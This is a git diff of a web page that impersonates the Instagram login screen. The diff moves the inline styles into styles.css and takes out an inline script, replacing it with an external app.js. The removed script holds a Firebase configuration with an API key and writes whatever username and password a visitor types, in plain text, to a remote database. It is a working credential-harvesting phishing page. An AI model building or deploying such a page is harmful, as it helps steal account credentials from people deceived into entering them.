@@ -4,108 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram Login</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #fafafa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            width: 100%;
-            max-width: 350px;
-            padding: 20px;
-            background-color: #fff;
-            border: 1px solid #dbdbdb;
-            text-align: center;
-        }
-        .logo {
-            font-family: 'Billabong', cursive;
-            font-size: 50px;
-            margin-bottom: 20px;
-        }
-        .btn-facebook {
-            background-color: #3897f0;
-            color: #fff;
-            padding: 10px;
-            border: none;
-            border-radius: 4px;
-            font-weight: bold;
-            margin-bottom: 10px;
-            width: 100%;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .or {
-            display: flex;
-            align-items: center;
-            text-transform: uppercase;
-            color: #8e8e8e;
-            margin: 20px 0;
-        }
-        .or::before,
-        .or::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background-color: #dbdbdb;
-        }
-        .or::before {
-            margin-right: 10px;
-        }
-        .or::after {
-            margin-left: 10px;
-        }
-        .input {
-            width: 100%;
-            padding: 10px;
-            margin: 5px 0;
-            border: 1px solid #dbdbdb;
-            border-radius: 4px;
-            box-sizing: border-box;
-        }
-        .btn-login {
-            background-color: #3897f0;
-            color: #fff;
-            padding: 10px;
-            border: none;
-            border-radius: 4px;
-            font-weight: bold;
-            margin-top: 10px;
-            width: 100%;
-            cursor: pointer;
-        }
-        .forgot-password {
-            color: #3897f0;
-            text-decoration: none;
-            display: block;
-            margin-top: 10px;
-        }
-        .signup {
-            margin-top: 20px;
-        }
-        .signup a {
-            color: #3897f0;
-            text-decoration: none;
-        }
-        .img-facebook {
-            width: 20px;
-            height: 20px;
-            margin-right: 10px;
-        }
-    </style>
+    <link rel="stylesheet" type="text/css" href="styles.css">
 </head>
 <body>
     <div class="container">
         <img src="instagram.png" alt="instagram" style="width: 175px;">
         <!-- <div class="logo">Instagram</div> -->
         <button class="btn-facebook">
-             <img class="img-facebook" src="facebook.png" alt="facebook"> Continue with Facebook
+            <img class="img-facebook" src="facebook.png" alt="facebook"> Continue with Facebook
         </button>
         <div class="or">or</div>
         <input type="text" class="input" placeholder="Phone number, username, or email" id="username">
@@ -115,52 +21,6 @@
         <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
     </div>
     
-    <script type="module">
-      // Import the functions you need from the SDKs you need
-      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-app.js";
-      import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-analytics.js";
-      import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-database.js";
-
-      // Your web app's Firebase configuration
-      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
-      const firebaseConfig = {
-        apiKey: "AIzaSyBiW9VMzBA455a8sbpcjakHRMNOpPiBTMI",
-        authDomain: "instasuay.firebaseapp.com",
-        projectId: "instasuay",
-        storageBucket: "instasuay.appspot.com",
-        messagingSenderId: "735048252865",
-        appId: "1:735048252865:web:0f9c0dd4a3cb1ee01cc340",
-        measurementId: "G-7V7ZD0HPK4"
-      };
-
-      // Initialize Firebase
-      const app = initializeApp(firebaseConfig);
-      const analytics = getAnalytics(app);
-      const database = getDatabase(app);
-
-      document.getElementById('loginBtn').addEventListener('click', () => {
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
-
-        // Escrever dados no Realtime Database
-        set(ref(database, 'users/' + username), {
-          username: username,
-          password: password
-        });
-
-        // Ler dados do Realtime Database
-        const dbRef = ref(getDatabase());
-        get(child(dbRef, `users/${username}`)).then((snapshot) => {
-          if (snapshot.exists()) {
-            console.log(snapshot.val());
-            window.href = "result.html"
-          } else {
-            console.log("No data available");
-          }
-        }).catch((error) => {
-          console.error(error);
-        });
-      });
-    </script>
+    <script src="app.js" type="module"></script>
 </body>
 </html>
